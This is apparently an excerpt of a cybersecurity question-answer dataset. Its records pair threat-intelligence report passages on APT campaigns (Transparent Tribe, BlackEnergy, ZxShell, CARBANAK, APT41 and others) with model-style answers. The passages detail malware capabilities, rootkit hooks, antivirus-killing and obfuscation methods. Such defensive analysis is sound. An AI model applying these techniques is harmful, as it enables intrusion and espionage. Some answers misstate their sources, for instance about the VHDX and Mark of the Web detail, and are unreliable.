continued into July 2021.\nHowever, beginning with June 2021, there was also a steady evolution in the distribution tactics used in this campaign. Around this time, we began observing the use of nontraditional initial entry mechanisms throughout the course of this campaign, suggesting a clear intention of aggressively infecting targets for espionage.\nFor instance, in June 2021, the attackers used IMG files for distribution, containing multiple infection artifacts \u2014 all COVID-19 themed \u2014 to trick targets into getting infected. Wrapping malware in IMG files is a tactic gaining traction with crimeware operators and APTs as a way to deliver malware to victims since newer versions of the Windows OS natively support IMG files.\nMalicious IMG distributed by Transparent Tribe.\nThe malicious image consists of four files:\nMalicious Python-based stager.\nDecoy PDF document containing a COVID-19-themed lure.\nVBS file for executing the stager and displaying the decoy.\nMalicious LNK file for activating the VBS on the endpoint.\nIn September 2021, the actors switched up their initial infection artifact and used VHDX files delivering the malicious droppers. VHDX files (<https://docs.microsoft.com/en-us/archive/blogs/ie/mark-of-the-web>)Mark Of the Web (MOTW) stamps and thus artifacts such as maldocs, delivered through these wrappers aren't identified as originating from the internet by Microsoft utilities such as Word, Excel etc. - allowing the attackers to run malicious code on the endpoint without any Microsoft warnings.\nThe variant of the downloaders used here, previously disclosed by (<https://blog.cyble.com/2021/09/14/apt-group-targets-indian-defense-officials-through-enhanced-ttps/>)Cyble, masqueraded as an app from the (<http://csdindia.gov.in/>)Canteen Stores Department (CSD) of the Government of India. On execution, this variant would open the legitimate website for CSD on the target's system. However, as seen previously with Transparent Tribe, the threat actors continued the development of similar infection chains consisting of various themes to distribute their malware without regard for any previous public disclosures.\nThe threat actor then introduced the use of RAR archives to distribute malicious malware in November 2021. The RAR archive consisted of the downloader, this time downloading a highly specific decoy PDF containing the work history of an Indian government official. The RAR archives are typically password-protected and hosted on public media sharing websites. Therefore, it is highly likely that Transparent Tribe used spearphishing emails to deliver download URLs for the archives to their targets via emails containing the passwords for the archives.\nTimeline of evolution of entry vectors:\nMedium Headline: CrimsonRAT\nCrimsonRAT is a popular malware RAT implant that consists of a wide variety of capabilities. It is the staple implant of choice for Transparent Tribe to establish long-term access into victim networks. This RAT is actively worked upon and has seen considerable updates over the years in not just the development of new capabilities, but also to obfuscate the implant by the APT group.\nThe latest version of CrimsonRAT seen in this campaign in January and February 2022 contains a number of capabilities, including:\nList files and folders in a directory path specified by the C2.\nRun specific processes on the endpoint \u2014 keylogger and USB modules.\nList process IDs and names running on the endpoint.\nGet information such as name, creation times and size of image files (pictures such as BMP, JPG etc.) specified by the C2.\nTake screenshots of the current screen and send it to C2.\nUpload keylogger logs from a file on disk to the C2.\nSend system information to C2 including:\nComputername, username, Operating System name, filepath of implant, parent folder path.\nIndicator of whether the keylogger module is in the endpoint and running and its version.\nIndicator of whether the USB module is in the endpoint and running and its version.\nRun arbitrary commands on the system.\nWrite data sent by C2 to a file on disk.\nRead contents of a file on disk and exfiltrate to C2.\nList all drives on the system.\nList all files in a directory.\nDownload the USB worm and keylogger modules from the C2 and write them to disk.\nSend a file's name, creation time and size to the C2- file path is specified by the C2.\nDelete files specified by the C2 from the endpoint.\nGet names, creation times and size of all files containing the file extension specified by the C2.\nCode Snippet: CrimsonRAT command handler.\nSeen in:\nJan-Feb 2022: Deployed by Kavach-themed downloaders.\nMedium Headline: Lightweight implant\nA new lightweight, .NET-based implant was also seen in this campaign in several infection chains. This implant has limited capabilities when compared to CrimsonRAT but contains enough functionality to control and monitor the infected system. Capabilities include:\nList all running processes on the endpoint.\nDownload and execute a file from the C2.\nDownload and execute a file specified by the C2 from another remote location.\nClose connection with the C2 until the next run.\nGather system information from the endpoint such as Computer Name, username, public and local IPs, Operating system name, list of runnings AVs, device type (desktop or laptop).\nThe implant also persists via an InternetShortcut in the current user's Startup directory.\nImplant downloading and executing a file from a remote location.\nSeen in:\nJan-Feb 2022: Deployed by Kavach-themed downloaders.\nNovember 2021: Seen in infection chains using RAR archives hosted on CMS.\nSeptember 2021: Deployed by CSD-themed downloaders.\nQuestion: Describe the different initial infection vectors used by Transparent Tribe in their campaign, including the use of IMG files and VHDX files.",
    "output": "Answer: Transparent Tribe has used various initial infection vectors, including malicious documents with macros, IMG files, VHDX files, and RAR archives. In June 2021, they used IMG files containing multiple infection artifacts, such as a malicious Python-based stager, a decoy PDF document, a VBS file, and a malicious LNK file. In September 2021, they switched to VHDX files, which do not trigger Microsoft warnings due to Mark Of the Web (MOTW) stamps. The VHDX files masqueraded as an app from the Canteen Stores Department (CSD) of the Government of India. In November 2021, they used RAR archives containing a downloader and a decoy PDF, likely distributed via spearphishing emails.",

Specifically, the PowerShell scripts used by APT28 to download and execute the Seduploader malware may have been designed to modify the process arguments to appear benign, thereby evading process-based detections. For example, the script may have used the WriteProcessMemory() function to override the process arguments after the process was spawned, making it difficult for defensive tools to detect the malicious activity. Furthermore, the use of DDE within a document file to execute PowerShell and fetch a remote payload from a distribution site may also involve the manipulation of process arguments to avoid detection. Overall, the APT28 threat group's use of PowerShell scripts and DDE techniques may involve the use of Hide Artifacts: Process Argument Spoofing to evade defenses and remain undetected.",

It is more likely that the ransomware component is a ruse and the real purpose of the attacks are disruption and data destruction.\nHermeticWiper, also known as FoxBlade, is a data wiper found targeting finance and government contractor organizations in Ukraine, Latvia, and Lithuania, .\nthat their telemetry indicated the malware was delivered to hundreds of systems in Ukraine, and the malware was executed on February 23, 2022, following DDoS attacks on Ukrainian websites earlier that day.\nIt was also reported by ESET that the malware was a signed executable, with a code-signing certificate issued to Hermetica Digital Ltd.

    "output": "Answer: The use of code-signing certificates enhances the effectiveness of malware like HermeticWiper by allowing it to bypass detection mechanisms such as Microsoft Defender SmartScreen and built-in browser protections. This makes the malware appear legitimate and increases its chances of successful deployment. The potential attribution of HermeticWiper to Russian state-associated actors is supported by several factors. Firstly, the timing of the mass deployment of HermeticWiper coincided with kinetic attacks and other cyberattacks on Ukraine. Secondly, the methodology employed is similar to past attacks by Russian government-associated actors, such as WhisperGate and NotPetya.

    "output": "Limited visibility is a significant challenge because the position of the threat intelligence producer shapes the nature of the research. Different companies have different levels and types of visibility into an attack, leading to incomplete pictures of the operation. For example, endpoint security companies might see payloads without network traffic, while ISPs might see network traffic and victimology without payloads. Claiming perfect awareness over a campaign is therefore short-sighted, as the same actors can continue their efforts with retooled methods.

It targets not just Russian citizens but the entire Russian-speaking population of planet Earth. Beyond that, it is expected that the narrative's influence will organically spread outside the diaspora.\nThe basic storyline is easy to comprehend and to convey, and is intended to be become a foundation for the interpretation of current and future world events. In this narrative, Russia is a misunderstood and misjudged superpower, and a necessary counterweight to Western liberal values. By contrast, the West has experienced\na decay of 'traditional values' and acts hypocritically in the international arena.

Conclusion\nThe Desert Falcons' attacks show clearly that zeroday techniques are not a must for efficient targeted attacks. Using phishing emails, social engineering and homemade tools and backdoors, the Desert Falcons were able to infect hundreds of sensitive and important victims in the Middle East region through their computer systems or mobile devices.\nThis is just an alert for the poor cyber security situation in the region. Banks, Media outlets, Governments and Military entities in different countries all fell prey to the Desert Falcons' attacks.\nFalcons' threat actors are determined, active and have good technical knowledge. We expect their operations to carry on developing more Trojans and using more advanced techniques.

How does this reflect on the cybersecurity situation in the Middle East?",
    "output": "The Desert Falcons' attacks were successful due to their use of phishing emails, social engineering, and homemade tools and backdoors. They did not rely on zero-day techniques but instead leveraged well-crafted phishing emails and documents that were professionally designed and contained interesting, familiar details for the victims. The victims were carefully chosen, being active and influential in their respective cultures, making them attractive targets for intelligence gathering and extortion. The success of these attacks reflects poorly on the cybersecurity situation in the Middle East, as it indicates that even without using sophisticated zero-day techniques, the Desert Falcons were able to infect hundreds of sensitive and important victims, including banks, media outlets, governments, and military entities across different countries.",

    "instruction": "Context: Big Headline: ATTACK OVERVIEW\nAt the time of writing, we have little information on how exactly victims are receiving the BlackEnergy malware being pushed by the Quedagh gang. An educated guess is that they are receiving the malware via targeted emails containing malicious attachments. Meanwhile, the following infection and technical details are based on samples gathered after searching through F-Secure Labs' collection of all BlackEnergy samples and identifying those with Quedagh characteristics.\nThe BlackEnergy toolkit comes with a builder application which is used to generate the clients that the attacker(s) use to infect victim machines. The toolkit also comes with server-side scripts, which the attackers set up in the command and control (C&C) server. The scripts also provide an interface where an attacker can control his bots. The simplicity and convenience provided by the toolkit means that anyone who has access to the kit can build his own botnet without any skills required.\nFigure 1: BlackEnergy Builder from 2007\nThe original BlackEnergy toolkit first emerged in 2007 and is referred to in this paper as BlackEnergy 1. A later variant of the toolkit (BlackEnergy 2) was released in 2010. We also encountered a previously unseen variant, which had been rewritten and uses a different format for its configuration. It also no longer uses a driver component. We dubbed this new variant BlackEnergy 3.\nBig Headline: INFECTION VECTORS\nMost of the recent BlackEnergy installers collected are named msiexec.exe. We believe they are either dropped by another executable that uses social engineering tricks to mislead the user into executing the installer, or by documents containing exploits that silently perform the installation.\nWe found at least 2 trojanized legitimate applications that execute the installer (in addition to their legitimate tasks). Trojanization is an effective infection method, as most users have no way of observing that a malicious component is being installed in tandem with a legitimate program.\nSome earlier installer variants, then named regedt32. exe, were distributed by documents exploiting software vulnerabilities, one of which was CVE-2010-3333. These documents drop and execute the installer, then open a decoy document. It is reasonable to assume that a similar approach has been used to deliver the more recent installer variants.\nThe installer filename of BlackEnergy 3 is still msiexec.exe. However, it is delivered and executed by a dropper which opens a decoy document in the foreground. We also encountered a standalone, non-persistent sample that pretends to be Adobe Flash Player Installer. It does not use any decoy document or application and does not run after reboot.\nThe overview below summarizes the various infection vectors used by the Quedagh gang to deliver BlackEnergy crimeware to the designated targets.\nBig Headline: TARGET DETAILS\nFrom the very earliest variants we were able to attribute to Quedagh, we have noticed that their targets have been political in nature. Apart from other indicators, we can deduce the nature of the target based on the content of social engineering tactics used to distribute the installers. For example, one decoy dropped from a sample dating to 2012 (image 2) seems to be targeting European audiences and discusses a political/economic situation. Strings found in another sample from 2012 (image 3) again indicate a political motivation behind the attack. Most decoys used content taken from news sites; we noted one decoy dropped by an exploit document was created using the Russian version of Office (image 4).\nThe latest variant of the dropper pretends to be a document file with a Ukrainian filename (image 5).  The choice of language for the filename again may tie  in or reference the current political crisis in that country. The filename itself means 'password list' in English.\nBig Headline: UKRAINE-RELATED PROXIES\nWhile examining the samples collected during our BlackEnergy monitoring, we noticed that samples from this year had been updated to support the use of proxy servers while connecting to their C&C servers. This contrasts with earlier BlackEnergy 2 variants, which do not support proxy servers. In some network setups, a proxy server is needed to allow internal users to access the Internet . BlackEnergy\u00b9s use of a proxy server may indicate that the gang has prior knowledge of the target organization's internal setup to note of this requirement.\nFor example, in one sample the configuration uses  the proxy server associated with the Ukrainian Railway (image 6). The configuration from another sample also shows it using an internal proxy under the giknpc domain (image 7). The domain giknpc.com.ua in turn hosts 3 domains (image 8), one of which is for the city of Dnipropetrovsk (image 9), the fourth-largest city in Ukraine, located in the southeast. Based on the set proxy servers for the different samples, we concluded that the gang is targeting Ukrainian government organizations.\nImage 2:\nDecoy document circa 2012\nImage 3:\nStrings from a sample circa 2012\nImage 4:\nDecoy document created using a Russian version of Office\nImage 5:\n2014 dropper sample disguised as a document. The filename means password list\nImage 6:\nConfiguration using Ukrainian Railway's proxy\nImage 7:\nConfiguration using internal proxy under giknpc domain\nAnswer this question: What are the key differences between the original BlackEnergy toolkit (BlackEnergy 1), its later variant (BlackEnergy 2), and the newly discovered variant (BlackEnergy 3)?",
    "output": "The original BlackEnergy toolkit, referred to as BlackEnergy 1, emerged in 2007. A later variant, BlackEnergy 2, was released in 2010. The newly discovered variant, dubbed BlackEnergy 3, has been rewritten and uses a different format for its configuration. Unlike its predecessors, BlackEnergy 3 no longer uses a driver component.

    "instruction": "Write an answer to the following question: How does the Advanced Persistent Threat (APT) use reconnaissance to gather information and tailor its attacks to specific targets, such as civil society organizations?",
    "output": "Reconnaissance is a critical phase of the adversary lifecycle, where the adversary gathers information to plan future operations. In the context of the APT, reconnaissance plays a crucial role in gathering information about the target organization, infrastructure, and staff/personnel. The APT uses this information to tailor its attacks to specific targets, increasing the likelihood of success. For example, the APT may use reconnaissance to gather information about a civil society organization's employees, their roles, and their interests. This information can then be used to craft targeted emails that appear to come from a legitimate source, increasing the chances of the email being opened and the malware being executed. Furthermore, the APT may use reconnaissance to gather information about the organization's security measures, such as the types of antivirus software used, to evade detection. The use of reconnaissance by the APT is evident in the targeted emails received by the civil society organizations, which were tailored to the interests of the targeted groups and contained relevant information that was likely gathered through prior compromise or open-source research.",

    "instruction": "Big Headline: Kernel Device Driver LoveUSD\nApart from user-mode ZxShell droppers mentioned earlier, there is a file (SHA256: 1e200d0d3de360d9c32e30d4c98f07e100f6260a86a817943a8fb06995c15335) that installs a kernel device driver called loveusd.sys. The architecture of this dropper is different from the others: it starts extracting the main driver from itself. It adds the SeLoadDriver privilege to its access token and proceeds to install the driver as a fake disk filter driver. ZxShell opens the registry key that describes the disk class drivers:\nSYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E967-E325-11CE-BFC1-08002BE10318}\nIt then adds the \"Loveusd.sys\" extracted driver name to the upper filter list. In our analysed sample the \"Loveusd.sys\" driver is installed with the name \"USBHPMS\". Finally the driver is started using the ZwLoadDriver native API.\nThe ZxShell driver starts by acquiring some kernel information and then hooking \"ObReferenceObjectByHandle\" API. Finally it spawns 2 system threads.\nThe first thread is the \"communication\" thread. ZxShell employs a strange method for communication: it hooks the NtWriteFile API and recognizes 5 different special handle values as commands:\n0x111111111 -- Hide \"Loveusd\" driver from the system kernel driver list\n0x22222222 -- Securely delete an in-use or no-access target file-name\n0x44444444 -- Unhook the ZwWriteFile API and hook KiFastCallEntry\n0x55555555 -- Remove the ZxShell Image Load Notify routine\n0x88888888 -- Set a special value called \"type\" in Windows registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DriverMain\nThe second Loveusd system thread does a lot of things. Its principal duties are to create the ZxShell main DLL in \"c:\\Windows\\System32\\commhlp32.dll\" and to install the Kernel \"Load Image Notify routine\". The code then tries to kill each process and service that belongs to the following list of AV products:\nSymantec Firewall\nNorton\nESET\nMcAfee\nAvast\nAvira\nSophos\nMalwarebytes\nNext, the ZxShell Load-Image Notify function prevents the AV processes from restarting.\nThe installation procedure continues in the user-mode dropper. The ZxShell service is installed as usual, and the in-execution dropper is deleted permanently using the special handle value 0x22222222 for the WriteFile API call. This handle value is invalid: all the windows kernel handle values are by design a multiple of 4. The ZxShell hook code knows that and intercept it.\nObReferenceObjectByHandle is a Kernel routine designed to validate a target object and return the pointer to its object body (and even its handle information), starting from the object handle (even the user-mode one). The hook installed by ZxShell implements one of its filtering routine. It filters each attempt to open the ZxShell protected driver or the main DLL, returning a reference to the \"netstat.exe\" file. The protection is enabled to all processes except for ones in the following list: Svchost.exe, Lsass.exe, Winlogon.exe, Services.exe, Csrss.exe, ctfmon.exe, Rundll32.exe, mpnotify.exe, update.exe.\nIf the type of the object that the system is trying to validate is a process, the hook code rewrites again the configuration data of the ZxShell service in the windows registry.\nImage 6. Our test Windows XP workstation trying to open the sys file of ZxShell LOVEUSD driver\nThe last type of Kernel modification that ZxShell rootkit performs is the system call dispatcher (KiFastCallEntry) hook. In this manner, ZxShell is able to completely hide itself, intercepting the following Kernel API calls: ZwAllocateVirtualMemory, ZwOpenEvent, ZwQueryDirectoryFile, ZwWriteFile, ZwEnumerateKey, and ZwDeviceIoControlFile.\nBig Headline: Malware Package\nWe used the ZxShell package for version 3.10 (SHA256:\n1622460afbc8a255141256cb77af61c670ec21291df8fe0989c37852b59422b4).The convenient thing about this is that the CNC panel worked with any version, 3.10 and above. The buttons are all in Chinese, with the help of Google Translate and keen detective skills (read: button clicking), we've deciphered the functionality.\nWhen you start the controller, you need to set the port you want to listen on and if you've set a password, add it here.\nOnce an infected machine connects, you see its information displayed in a selection box at the top. There are some built in functions on the side for the more common features. These include remote desktop, webcam spying, remote shell, and file management. You can also select a host and type help for a full list of commands.\nI have the same machine infected with two different version of ZxShell. Sending the help command for each, you can see the extra features added between version 3.1 and 3.2.\nKeylogging, ZXARPS (IP and URL spoofing), and SYNFlood are some of the interesting features added to version 3.2.\nBig Headline: Version Information\nWe wrote a script to extract version info from the binaries we have.\n3.100 : 914\n3.200 : 152\n3.210 : 118\n3.220 : 14\n3.390 : 3\nIn versions 3.1 -- 3.21, the configuration info is xor encoded with 0x85. This configuration info can be changed with a tool included in the ZxShell package.\nIn versions 3.22 and 3.39 the routine changes. The new xor encoding byte is 0x5B. The data is stored in the last 0x100 bytes of the file. The first 8 bytes of data are static. Then there is the dll install name, the domain, and the port.\nBig Headline: Extracted URL Analysis\nKnowing the obfuscation routines for this data we wrote a script to extract the URLs / IPs and ports stored.\nThe most common ports used are, 80, 1985, 1986, and 443. 1985 is the default port for the malware, 1986 is the lazy variation of that port. Port 80 and 443 are the default ports for HTTP and HTTPS traffic. The next most common is port 53. This is used in some of the newer 3.22 and 3.39 samples. After that, the count for each port starts declining sharply. The choices are interesting though, many correspond to what looks like the birth year of the controller (ie. years in the late 1980s and early 1990s), and others seem to match what year the malware was launched in (ie. in the 2000s, relatively close to the current year).\nSince this malware dates back to around 2004, there are many samples containing CNC URLs from the 3322.org page. This page used to offer no-ip type hosting and was widely used by malware authors. So much so that Microsoft did a takedown in 2012. A similar service, vicp.net, is also seen in many of the domains.\nIn the malware, if a domain is configured, it will retrieve domain.tld/myip.txt. This file contains a list of IP addresses for the infected machine to connect back to. Otherwise, if an IP address is configured, it will connect directly to that IP address.\nBig Headline: Cloning the ZxShell Server\nWe have written a simple C++ ZxShell Server that implements the communication and the handshake for the version 3.10 and 3.20 of the ZxShell DLL. The implementation is quite simple: After the handshake, 2 threads that deal with data transfer are spawned. Here we have some screenshots that show the Server and the ZxShell Keylogger in action:\nOur server has accepted a connection from a remote host\nThe ZxShell keylogger has captured 2 user passwords(gmail.com and amazon.com)\nThe last image shows a very interesting feature of the ZxShell keylogger: once installed and activated, the keylogger is able to catch each password that the user inserts in the login box of each website (like Google, Amazon and so on\u2026). This makes the keylogger a perfect weapons for the attackers. They will be able to steal and resell in the underground market the sensitive data of each victim.\nBig Headline: Conclusion\nAdvanced persistent threats will remain a problem for companies and organizations of all sizes, especially those with high financial or intellectual property value. Group 72's involvement in Operation SMN is another example of what sort of damage that can be done if organizations are not diligent in their efforts to secure their networks. ZxShell is one sample amongst several tools that Group 72 used within their campaign.\nZxShell is a sophisticated tool employed by Group 72 that contains all kinds of functionality. Its detection and removal can be difficult due to the various techniques used to conceal its presence, such as disabling the host anti-virus, masking its\ninstallation on a system with a valid service name, and by masking outbound traffic as originating from a web browser. While other techniques are also utilized to conceal and inhibit its removal, ZxShell's primary functionality is to act as a Remote Administration Tool (RAT), allowing the threat actor to have continuous backdoor access on to the compromised machine.\nAs our analysis demonstrates, ZxShell is an effective tool that can be ultimately used to steal user credentials and other highly valuable information. The threat posed by ZxShell to organizations is one that cannot be ignored. Organizations with high financial or intellectual property value should take the time to ensure their security requirements are met and that employee's are educated about the security threats their organizations face.\nFor additional information, please see our (<http://blogs.cisco.com/talos/threat-spotlight-group-72/>)blog post.\nBig Headline: Appendix A: Snort Rules\nInitial connection from the infected computer's perspective -- after it connects to the controller -\nThe rules are on the first 8 bytes of the first two packets. They are hard coded in the binaries. The rest of the bytes are variable (for example, 66664640 is a floating point version number of ZxShell).\nSnort rules:\nsid:32180\nsid:32181\nThese rules have been released in our community ruleset and can be (<https://www.snort.org/downloads>)downloaded and used directly, or via (<https://code.google.com/p/pulledpork/>)pulledpork from Snort.org\n\nExplain the significance of the ZxShell keylogger feature and how it can be used by attackers to steal sensitive data.",
    "output": "The ZxShell keylogger feature is significant because it captures each password that the user enters in the login boxes of websites like Google, Amazon, and others. This capability makes the keylogger a powerful weapon for attackers, enabling them to steal and potentially resell sensitive data such as user credentials in the underground market. By capturing login information, attackers can gain unauthorized access to various accounts, leading to further exploitation and potential financial or intellectual property theft.",

    "instruction": "Context: Big Headline: Executive Summary\nSince November, geopolitical tensions between Russia and Ukraine have escalated dramatically. It is estimated that Russia has now amassed over 100,000 troops on Ukraine's eastern border, leading some to speculate that an invasion may come next. On Jan. 14, 2022, this conflict spilled over into the cyber domain as the Ukrainian government was targeted with destructive malware ((<https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/>)WhisperGate) and a separate vulnerability in OctoberCMS was exploited to deface several Ukrainian government websites. While attribution of those events is ongoing and there is no known link to  (aka Primitive Bear), one of the most active existing advanced persistent threats targeting Ukraine, we anticipate we will see additional malicious cyber activities over the coming weeks as the conflict evolves. We have also observed recent activity from Gamaredon. In light of this, this blog provides an update on the Gamaredon group.\nSince 2013, just prior to Russia's annexation of the Crimean peninsula, the Gamaredon group has primarily focused its cyber campaigns (<https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution/>)against Ukrainian government officials and organizations. In 2017, Unit 42 published its first research documenting Gamaredon's evolving toolkit and naming the group, and over the years, several researchers have noted that the operations and targeting activities of this group align with Russian interests. This link was recently substantiated on Nov. 4, 2021, when the Security Service of Ukraine (SSU) (<https://www.bleepingcomputer.com/news/security/ukraine-links-members-of-gamaredon-hacker-group-to-russian-fsb/>)publicly attributed the leadership of the group to five Russian Federal Security Service (FSB) officers assigned to posts in Crimea. Concurrently, the SSU also released an updated (<https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf>)technical report documenting the tools and tradecraft employed by this group.\nGiven the current geopolitical situation and the specific target focus of this APT group, Unit 42 continues to actively monitor for indicators of their operations. In doing so, we have mapped out three large clusters of their infrastructure used to support different phishing and malware purposes. These clusters link to over 700 malicious domains, 215 IP addresses and over 100 samples of malware.\nMonitoring these clusters, we observed an attempt to compromise a Western government entity in Ukraine on Jan. 19, 2022. We have also identified potential malware testing activity and reuse of historical techniques involving open-source virtual network computing (VNC) software. The sections below offer an overview of our findings in order to aid targeted entities in Ukraine as well as cybersecurity organizations in defending against this threat group.\nUpdate Feb. 16: When we originally published this report, we noted, \"While we have mapped out three large clusters of currently active Gamaredon infrastructure, we believe there is more that remains undiscovered.\" We have since discovered hundreds more Gamaredon-related domains, including known related-clusters, and also new clusters. We have updated our (<https://unit42.paloaltonetworks.com/gamaredon-primitive-bear-ukraine-update-2021/#indicators-of-compromise>)Indicators of Compromise (IoCs) to include these additional domains and cluster observations.\nFull visualization of the techniques observed, relevant courses of action and IoCs related to this Gamaredon report can be found in the (<https://unit42.paloaltonetworks.com/atoms/gamaredon/>)Unit 42 ATOM viewer.\nPalo Alto Networks customers receive protections against the types of threats discussed in this blog by products including and the , , (<https://www.paloaltonetworks.com/network-security/advanced-url-filtering>)Advanced URL Filtering and (<https://www.paloaltonetworks.com/network-security/dns-security>)DNS Security subscription services for the .\nRelated Unit 42 Topics ,\nAnswer this question: How has the Gamaredon group evolved its toolkit and targeting activities since its inception in 2013, and how does this evolution align with Russian interests?",
    "output": "The Gamaredon group, also known as Primitive Bear, has been active since 2013 and has primarily targeted Ukrainian government officials and organizations. Over the years, the group has evolved its toolkit, as documented by Unit 42 in 2017. Several researchers have noted that the operations and targeting activities of this group align with Russian interests. This alignment was substantiated on November 4, 2021, when the Security Service of Ukraine (SSU) publicly attributed the leadership of the group to five Russian Federal Security Service (FSB) officers assigned to posts in Crimea. The SSU also released an updated technical report documenting the tools and tradecraft employed by this group. The group's focus on Ukrainian targets and its evolution in tactics, techniques, and procedures (TTPs) demonstrate a strategic alignment with Russian geopolitical objectives.",

    "instruction": "Big Headline: Mike's Perspective\nHaving source code sounds like cheat-mode for malware analysis. Indeed, source code contains much information that is lost through the compilation and linking process. Even so, CARBANAK's tasking component (for handling commands sent by the C2 server) serves as a counter-example. Depending on the C2 protocol used and the command being processed, control flow may take divergent paths through different functions only to converge again\nlater and accomplish the same command. Analysis required bouncing around between almost 20 functions in 5 files, often backtracking to recover information about function pointers and parameters that were passed in from as many as 18 layers back. Analysis also entailed resolving matters of C++ class inheritance, scope ambiguity, overloaded functions, and control flow termination upon named pipe usage. The overall effect was that this was difficult to analyze, even in source code.\nI only embarked on this top-to-bottom journey once, to search for any surprises. The effort gave me an appreciation for the baroque machinery the authors constructed either for the sake of obfuscation or flexibility. I felt like this was done at least in part to obscure relationships and hinder timely analysis.\nBig Headline: Anti-Analysis Mechanisms in Source Code\nCARBANAK's executable code is filled with logic that pushes hexadecimal numbers to the same function, followed by an indirect call against the returned value. This is easily recognizable as obfuscated function import resolution, wherein CARBANAK uses a simple string hash known as PJW (named after its author, P.J. Weinberger) to locate Windows API functions without disclosing their names. A Python implementation of the PJW hash is shown in Figure 11 for reference.\nThis is used several hundred times in CARBANAK samples and impedes understanding of the malware's functionality. Fortunately, reversers can use the to annotate the obfuscated imports, as shown in Figure 12.\nThe CARBANAK authors achieved this obfuscated import resolution throughout their backdoor with relative ease using C preprocessor macros and a pre-compilation source code scanning step to calculate function hashes. Figure 13 shows the definition of the relevant API macro and associated machinery.\nThe API macro allows the author to type API(SHLWAPI, PathFindFileNameA)(\u2026) and have it replaced with GetApiAddrFunc(SHLWAPI, hashPathFindFileNameA)(\u2026). SHLWAPI is a symbolic macro defined to be the constant 3, and hashPathFindFileNameA is the string hash value 0xE3685D1 as observed in the disassembly. But how was the hash defined?\nThe CARBANAK source code has a utility (unimaginatively named tool) that scans source code for invocations of the API macro to build a header file defining string hashes for all the Windows API function names encountered in the entire codebase. Figure 14 shows the source code for this utility along with its output file, api_funcs_hash.h.\nWhen I reverse engineer obfuscated malware, I can't help but try to theorize about how authors implement their obfuscations. The CARBANAK source code gives another data point into how malware authors wield the powerful C preprocessor along with custom code scanning and code generation tools to obfuscate without imposing an undue burden on developers. This might provide future perspective in terms of what to expect from malware authors in the future and may help identify units of potential code reuse in future projects as well as rate their significance. It would be trivial to apply this to new projects, but with the source code being on VirusTotal, this level of code sharing may not represent shared authorship. Also, the source code is accessibly instructive in why malware would push an integer as well as a hash to resolve functions: because the integer is an index into an array of module handles that are opened in advance and associated with these pre-defined integers.\n\nQ: What insights can be gained from analyzing the CARBANAK source code regarding the use of the C preprocessor and custom code scanning tools for obfuscation? How might this knowledge help in anticipating future malware development techniques and identifying code reuse?",
    "output": "A: Analyzing the CARBANAK source code provides valuable insights into how malware authors leverage the C preprocessor and custom code scanning tools to implement obfuscation without imposing an undue burden on developers. The authors use C preprocessor macros to replace function calls with hashed equivalents, and a custom utility scans the source code to generate a header file with string hashes for all Windows API function names. This approach not only obfuscates the malware's behavior but also simplifies the development process. Understanding these techniques can help cybersecurity experts anticipate similar methods in future malware projects. By recognizing patterns of code reuse, analysts can identify potential shared authorship or common development practices among different malware families. However, with the source code being publicly available on VirusTotal, the extent to which this represents shared authorship is uncertain. Nonetheless, the source code offers a clear explanation of why malware pushes both an integer and a hash to resolve functions: the integer serves as an index into an array of module handles that are opened in advance and associated with pre-defined integers.",

In range mode, the payload iterates through a specified range of IOAs to discover those of the single command type and then enters an infinite loop to send 'select and execute' packets, potentially flipping the On/Off state.

Please refer to the attachment for other details!\nCASE STUDY\nVideo Game Industry Targeting\nAPT41 continuously returns to targeting the video game sector and seems to have matured its campaigns through lessons learned in operations against the industry. We believe these operations include broadly malicious activity that can enable further operations, such as targeting game source code and compromising digital certificates, while other activities are explicitly financially motivated, such as abusing in-game currency mechanics. APT41 campaigns focused on the video game sector have largely affected studios and distributors in East and Southeast Asia, although global companies based in the United States have also been targeted.\nThe group leverages many TTPs during the targeting of video game-related organizations, which are likewise employed in their espionage operations.\n\u2022 Since at least 2012, APT41 has repeatedly gained access to game development environments within affected companies, including online multiplayer networks, as well as targeting of production database administrators.\n\u2013 The group is competent in both Linux and Windows environments and can pivot easily between both environments within a single operation, including compromising intermediary servers that provide access to separated Windows and Linux environments.\n\u2013 In October 2012, APT41 used captured credentials to compromise a jump server and access a production environment where they deployed a Linux version of PHOTO. Based on the machines targeted, we have some indication that APT41 specifically sought to access production machines used in the development of an upcoming online game.\n\u2013 In 2014, APT41 used a variant of SOGU that is capable of connecting to Windows and Linux systems via SSH and Samba/CIFS.\n\u2013 APT41 has been observed inserting malicious code into legitimate video game files to distribute malware. In 2018, the group inserted CRACKSHOT malware into game files that were signed with legitimate code-signing certificates, most likely indicating access to the production environment, which facilitated a supply chain compromise.\n\u25aa A highly similar incident in 2014 suggests that APT41 (or a closely affiliated actor) has a history of carrying out such operations against the video game industry.\n\u2013 APT41's experience gaining access to production environments may have been a precursor to more recent supply chain compromises. The insertion of malware into a build environment for later distribution with legitimate software is a natural extension of the group's earliest activities. Additional details are provided in the section \"History of Supply Chain Compromises.\"\n\u2022 We have also observed APT41 limitedly deploy rootkits on Linux systems and Master Boot Record (MBR) bootkits, such as ROCKBOOT, on Windows systems to hide their malware and maintain persistence on victim systems. Selective deployment of ROCKBOOT suggests that APT41 reserves more advanced TTPs and malware only for high-value targets.\n\u2013 Bootkits are a stealthy means of installing malware because the code resides outside of the OS. Because bootkits are initialized prior to the OS and operate in kernel mode, OS applications and security tools may have great difficulty detecting bootkits.\n\u2013 The use of bootkits among threat actors, however, is rare. It is more common for threat actors to rely on techniques such as DLL search order hijacking or modifying Windows registry keys to achieve persistence.\n\u2013 The group used the Adore-NG rootkit on older Linux operating systems to hide their Linux backdoor ADORE.XSEC. Note that the Adore-ng rootkit is no longer in development and would likely not run successfully on modern Linux systems, but APT41 deployed this on a legacy game server.\nAPT41 is well-known for leveraging compromised digital certificates from video game studios to sign malware. The group has abused at least 19 different certificates in this way. Additional details on code-signing certificates are provided in the section \"Use of Code Signing Certificates.\"\n\u2022 In 2012, APT41 used a code-signing certificate from Mgame, a South Korean game publisher, against other gaming industry entities. The serial number for this certificate was:\n01:00:00:00:00:01:30:73:85:f7:02\n\u2022 A different Mgame digital certificate has been used by several other Chinese operators, including APT17, APT20, and APT31. It is unclear if this certificate was compromised at the same time as the one used by APT41 (or if it was stolen by APT41 and shared with these other groups). The serial number for this certificate 